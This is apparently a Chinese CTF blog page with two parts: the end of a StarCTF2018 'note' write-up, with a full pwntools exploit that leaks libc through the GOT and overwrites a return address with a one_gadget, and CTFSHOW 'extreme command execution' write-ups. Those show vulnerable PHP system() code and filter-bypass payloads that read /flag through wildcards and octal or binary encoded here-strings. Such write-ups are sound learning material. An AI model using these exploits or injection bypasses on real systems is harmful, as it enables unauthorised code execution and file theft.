<p>那么下一次输入选项时  可以发送 <code>int(2)  + ptr_to_%256s + puts@got</code> 来选择输出选项并保持栈上变量内容<br>得到libc基址后计算one_gadget</p>
<p>在下一次输入选项时 覆盖<code>__isoc99_scanf</code>的ret addr  为one_gadget   （调试得到该ret addr与option地址偏移为0x64）</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">belf = ELF(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edt</span>(<span class="params">con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;Note&#x27;</span>, con)</span><br><span class="line">    </span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0000000000400DB6</span></span><br><span class="line"><span class="string">    b * 0x0000000000400F01</span></span><br><span class="line"><span class="string">    b * 0x0000000000400EF3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> + <span class="string">&#x27;c\n&#x27;</span> * <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">a256s = <span class="number">0x401129</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;ID:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">edt((<span class="string">b&#x27;h&#x27;</span> * <span class="number">0xa8</span> + p64(a256s) + p64(belf.got[<span class="string">&#x27;puts&#x27;</span>])).ljust(<span class="number">0x100</span>, <span class="string">b&#x27;h&#x27;</span>))	<span class="comment"># 布置栈上内容并off_by_one一个0x00字节</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>, p32(<span class="number">2</span>) + p64(a256s) + p64(belf.got[<span class="string">&#x27;puts&#x27;</span>]))	</span><br><span class="line">libc_base = ga() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ls(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;h&#x27;</span> * <span class="number">0x64</span> + p64(libc_base + gadgets[<span class="number">1</span>]))	<span class="comment"># 覆盖__isoc99_scanf的 ret_addr</span></span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/29/StarCTF2018-note-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/28/CTFSHOW-extremeRCE-wp/" >CTFSHOW 极限命令执行 wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-28
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<h2 id="CTFSHOW-极限命令执行1"><a href="#CTFSHOW-极限命令执行1" class="headerlink" title="CTFSHOW 极限命令执行1"></a><a target="_blank" rel="noopener" href="https://ctf.show/challenges#%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1-3947">CTFSHOW 极限命令执行1</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里，或者直接运行根目录getflag</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;????????&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 可用字符：  ! $ &#x27; ( ) , . / 0 1 2 3 4 5 6 7 8 9 = ? \ a ~ </span></span><br></pre></td></tr></table></figure>

<p>可以用通配符执行命令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1：ctf_show=/?????a?	<span class="comment"># /getflag</span></span><br><span class="line">payload2：ctf_show=/???/?a??64 /??a?		<span class="comment"># /bin/base64 /flag</span></span><br><span class="line">payload3: ctf_show=/???/???/?a??64 /??a?	<span class="comment"># /usr/bin/base64 /flag</span></span><br></pre></td></tr></table></figure>

<h2 id="CTFSHOW-极限命令执行2"><a href="#CTFSHOW-极限命令执行2" class="headerlink" title="CTFSHOW 极限命令执行2"></a><a target="_blank" rel="noopener" href="https://ctf.show/challenges#%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2-3948">CTFSHOW 极限命令执行2</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag在根目录flag里，或者直接运行根目录getflag</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检测过滤脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">alpha = string.printable</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line"></span><br><span class="line">	data = &#123;<span class="string">&quot;ctf_show&quot;</span>:i&#125;</span><br><span class="line">	res = requests.post(<span class="string">&quot;http://1b8d2008-3f7a-4db6-82fb-aef9af5e8893.challenge.ctf.show/&quot;</span>, data=data)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> res.text.endswith(<span class="string">&#x27;?&#x27;</span>):</span><br><span class="line">		t+=i+<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># 0 1 2 3 4 5 6 7 8 9 ! # $ &amp; &#x27; ( ) &lt; \ _ &#123; &#125; ~</span></span><br></pre></td></tr></table></figure>

<p>过滤了问号  这里使用<strong>8进制</strong>数字编码</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $<span class="string">&#x27;\154\163&#x27;</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">$ <span class="built_in">printf</span> <span class="string">&#x27;\154\163&#x27;</span></span><br><span class="line">$ $<span class="string">&#x27;\154\163&#x27;</span> <span class="comment"># 相当于执行ls</span></span><br></pre></td></tr></table></figure>

<h2 id="CTFSHOW-极限命令执行3"><a href="#CTFSHOW-极限命令执行3" class="headerlink" title="CTFSHOW 极限命令执行3"></a><a target="_blank" rel="noopener" href="https://ctf.show/challenges#%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C3-3949">CTFSHOW 极限命令执行3</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag在根目录flag里</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检测过滤脚本得到可用字符<code>0 1 ! # $ &amp; &#39; ( ) &lt; \ _ &#123; &#125; ~</code></p>
<p>数字只有0和1可用  想着能不能通过二进制来构造  bash中<code>$(())</code>可以进行数学运算  <code>$((2#101...))</code>将二进制串解释为十进制</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $((<span class="number">1</span>*<span class="number">3</span>))</span><br><span class="line">3</span><br><span class="line">$ <span class="built_in">echo</span> $((<span class="number">2#101</span>))</span><br><span class="line">5</span><br></pre></td></tr></table></figure>

<p>那么我们可以通过二进制构造不同数字，再通过数字编码来执行命令</p>
<p>但是2也是不可用的，怎么办呢？同样可以通过数学运算得来：<code>$((1&lt;&lt;1))</code>  则<code>$((2#101...)) -&gt; $(($((1&lt;&lt;1))#101...))</code></p>
<p>接着就可以构造数字编码了，以<code>ls</code>为例对应八进制数字编码为 ‘\154\163’</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))<span class="comment">#101))</span></span><br><span class="line">5</span><br><span class="line">$ <span class="built_in">echo</span> \<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10011010))\&#x27;</span>	<span class="comment"># 注意&#x27;和\都要转义</span></span><br><span class="line"><span class="string">&#x27;\154&#x27;</span></span><br><span class="line">$ <span class="built_in">echo</span> \<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;</span></span><br><span class="line"><span class="string">&#x27;\154\163&#x27;</span></span><br><span class="line">$ $\<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;</span></span><br><span class="line">$<span class="string">&#x27;\154\163&#x27;</span>: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>发现虽然成功解析出，但没有进一步解释执行  这里需要用到两个知识</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;&lt;&lt;三个小于号(here-strings)，语法：<span class="built_in">command</span> [args] &lt;&lt;&lt;[<span class="string">&quot;]<span class="variable">$word</span>[&quot;</span>]；<span class="variable">$word</span>会展开并作为<span class="built_in">command</span>的stdin</span><br><span class="line">2. <span class="variable">$0</span> 即为bash</span><br></pre></td></tr></table></figure>

<p>那么将输出作为bash的stdin即可解释执行，发送payload后也可以看到成功执行</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="variable">$0</span>&lt;&lt;&lt;$\<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;</span>	  <span class="comment"># ls</span></span><br><span class="line"></span><br><span class="line">check.php index.php</span><br></pre></td></tr></table></figure>

<h3 id="二进制命令脚本"><a href="#二进制命令脚本" class="headerlink" title="二进制命令脚本"></a>二进制命令脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;ls&#x27;</span></span><br><span class="line">res = <span class="string">&quot;$0&lt;&lt;&lt;$\\&#x27;&quot;</span>	<span class="comment"># res = &quot;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">	t = <span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:], <span class="number">10</span>)</span><br><span class="line">	t = <span class="built_in">bin</span>(t)</span><br><span class="line">	res +=<span class="string">&quot;\\\\$(($((1&lt;&lt;1))#&quot;</span> + t[<span class="number">2</span>:] + <span class="string">&quot;))&quot;</span></span><br><span class="line"></span><br><span class="line">res += <span class="string">&quot;\\&#x27;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p>若是执行<code>cat /flag</code> 则会报错</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="variable">$0</span>&lt;&lt;&lt;$\<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span></span><br><span class="line">bash: line 1: <span class="built_in">cat</span> /flag: No such file or directory</span><br></pre></td></tr></table></figure>

<p>这是因为bash执行不了带参数的命令 会将<code>cat /flag</code>整个字符串当成命令执行，所以找不到该文件</p>
<p>那么可以使用两次here-strings来解决</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="variable">$0</span>&lt;&lt;&lt;<span class="variable">$0</span>\&lt;\&lt;\&lt;\$\<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&#123;&#123;flag  here I am !!!!&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CTFSHOW-极限命令执行4"><a href="#CTFSHOW-极限命令执行4" class="headerlink" title="CTFSHOW 极限命令执行4"></a><a target="_blank" rel="noopener" href="https://ctf.show/challenges#%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C4-3950">CTFSHOW 极限命令执行4</a></h2><p>可用字符<code>0 ! # $ &amp; &#39; ( ) &lt; \ _ &#123; &#125; ~</code></p>
<p>字符<code>1</code>也被过滤了，那就想有没有办法构造字符1</p>
<p><strong>补充知识：</strong>  <code>$ = 1</code>  因此可以用<code>$</code>来代替1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">res = <span class="string">&quot;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">	t = <span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:], <span class="number">10</span>)</span><br><span class="line">	t = <span class="built_in">bin</span>(t)</span><br><span class="line">	res +=<span class="string">&quot;\\\\$(($((1&lt;&lt;1))#&quot;</span> + t[<span class="number">2</span>:] + <span class="string">&quot;))&quot;</span></span><br><span class="line"></span><br><span class="line">res += <span class="string">&quot;\\&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">res = res.replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&quot;$&#123;##&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># $0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span></span><br></pre></td></tr></table></figure>

<p>成功执行得到flag</p>
<h2 id="CTFSHOW-极限命令执行5"><a href="#CTFSHOW-极限命令执行5" class="headerlink" title="CTFSHOW 极限命令执行5"></a><a target="_blank" rel="noopener" href="https://ctf.show/challenges#%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C5-3951">CTFSHOW 极限命令执行5</a></h2><p>可用字符<code>! $ &amp; &#39; ( ) &lt; = \ _ &#123; &#125; ~</code></p>
<p>字符<code>0, #</code>也不能用了   这里继续使用数学运算得到各数字  <code>$(())</code>会计算括号中的表达式得到结果</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $(())</span><br><span class="line">0</span><br><span class="line">$ <span class="built_in">echo</span> $((~$(())))	<span class="comment"># $((~0))</span></span><br><span class="line">-1</span><br><span class="line">$ <span class="built_in">echo</span> $((~$(())))$((~$(())))</span><br><span class="line">-1-1</span><br><span class="line">$ <span class="built_in">echo</span> $(($((~$(())))$((~$(())))))	<span class="comment"># $((-1-1))</span></span><br><span class="line">-2</span><br><span class="line">$ <span class="built_in">echo</span> $((~$(($((~$(())))$((~$(())))))))	<span class="comment"># $((~(-2)))</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>由此  我们可以不用数字来构造命令  但是仍需要here-string来解释执行命令  但是0不可用，想着是否有别的替代方式</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="variable">$&#123;!#&#125;</span></span><br><span class="line">bash</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$&#123;!?&#125;</span></span><br><span class="line">bash</span><br></pre></td></tr></table></figure>

<p>可见这两种都可以充当bash，但是<code>#, ?</code>被过滤</p>
<p><strong><code>!</code>功能一览：</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">!!	<span class="comment"># 上一条命令</span></span><br><span class="line">!$	<span class="comment"># 上一条命令中的最后一个参数</span></span><br><span class="line">!:-	<span class="comment"># 上一命令除了最后一个参数</span></span><br><span class="line">!*	<span class="comment"># 上一条命令中的所有参数</span></span><br><span class="line">!str	<span class="comment"># 最近一条以str开头的命令</span></span><br><span class="line">!?str?	<span class="comment"># 最近一条包含str的命令</span></span><br><span class="line">!n	<span class="comment"># 顺数第n条命令</span></span><br><span class="line">!-n	<span class="comment"># 倒数第n条命令</span></span><br><span class="line">^old^new	<span class="comment"># 将上一命令中的old替换为new</span></span><br><span class="line">!!:gs/old/new	<span class="comment"># 将上一命令中的old替换为new</span></span><br><span class="line">!scp:gs/old/new	<span class="comment"># 将上一scp命令中的old替换为new</span></span><br></pre></td></tr></table></figure>

<p>那么有</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ __=$(())&amp;&amp;<span class="built_in">echo</span> <span class="variable">$__</span></span><br><span class="line">0</span><br><span class="line">$ !__</span><br><span class="line">__=$(())&amp;&amp;<span class="built_in">echo</span> <span class="variable">$__</span>	<span class="comment"># 此处__开头的命令被再次执行</span></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">$ __=$(())</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$&#123;!__&#125;</span></span><br><span class="line">bash</span><br><span class="line"></span><br><span class="line">$ __=$(())&amp;&amp;<span class="variable">$&#123;!__&#125;</span>&lt;&lt;&lt;<span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure>

<p>即可以用<code>__=$(())&amp;&amp;$&#123;!__&#125;</code>来代替<code>$0</code></p>
